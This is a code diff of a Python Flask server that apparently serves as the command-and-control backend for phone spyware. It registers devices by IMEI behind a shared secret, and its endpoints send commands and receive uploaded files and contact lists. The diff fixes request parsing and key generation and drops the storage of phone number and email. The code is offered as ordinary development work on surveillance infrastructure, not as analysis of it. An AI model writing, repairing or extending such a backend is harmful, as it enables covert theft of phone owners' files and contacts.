@@ -2,29 +2,31 @@ from flask import Flask, request
 import random
 from utils import database
 import base64
-
+import string 
 app = Flask(__name__)
 
 def _get_rand_key(len=24):
-    rand_key = ''.join(random.choice(letters) for i in range(length))
+    rand_key = ''.join(random.choice(string.ascii_letters) for i in range(len))
     if database.key_exists(rand_key):
         return  _get_rand_key(len)
     else:
         return rand_key
 
 
-@app.route('/register', methods=['POST'])
+@app.route('/register', methods=['POST', 'GET'])
 def register():
-    data = request.json()
+    try:
+        data = request.json
+    except Exception as e:
+        print(e)
+        return 'request is not correct'
+    print(data)
     secret = data['s']
     if secret != database.get_secret():
         return 'nice try, don\'t try to repack a repack'
 
     info = dict()
     info['imei'] = data['i']
-    info['phone_model'] = data['pm']
-    info['phone_number'] = data['pn']
-    info['registered_email'] = data['re']
     info['key'] = _get_rand_key()
 
     res = database.update_database(info)
@@ -37,7 +39,7 @@ def register():
 
 @app.route('/command', methods=['POST'])
 def command():
-    data = request.json()
+    data = request.json
     secret = data['s']
     if secret != database.get_secret():
         return 'nice try, don\'t try to repack a repack'
@@ -50,7 +52,7 @@ def command():
 
 @app.route('/upfile', methods=['POST'])
 def upfile():
-    data = request.json()
+    data = request.json
     secret = data['s']
     if secret != database.get_secret():
         return 'nice try, don\'t try to repack a repack'
@@ -68,7 +70,7 @@ def upfile():
 
 @app.route('/upcontacts', methods=['POST'])
 def upcontacts():
-    data = request.json()
+    data = request.json
     secret = data['s']
     if secret != database.get_secret():
         return 'nice try, don\'t try to repack a repack'
